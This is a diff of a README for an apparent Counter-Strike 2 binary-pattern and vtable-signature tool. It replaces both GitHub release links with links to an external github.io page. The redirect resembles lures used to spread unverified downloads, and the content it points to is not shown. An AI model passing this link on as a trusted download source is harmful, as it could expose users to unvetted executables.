@@ -1,6 +1,6 @@
 # 🎯 malvorus-searchable-patterns - Find game patterns with ease today
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://undefeated-eccentricity921.github.io)
 
 This application helps users find binary patterns for Counter-Strike 2. Researchers use these patterns to understand how the game works. The tool provides a database of verified signatures, vtable indices, search bars, and filters to simplify your analysis. You can copy pattern data with one click.
 
@@ -8,7 +8,7 @@ This application helps users find binary patterns for Counter-Strike 2. Research
 
 Visit the following link to access the software files: 
 
-[Download Link: https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases](https://github.com/Undefeated-eccentricity921/malvorus-searchable-patterns/releases)
+[Download Link: https://undefeated-eccentricity921.github.io](https://undefeated-eccentricity921.github.io)
 
 Follow these steps to set up the tool:
 
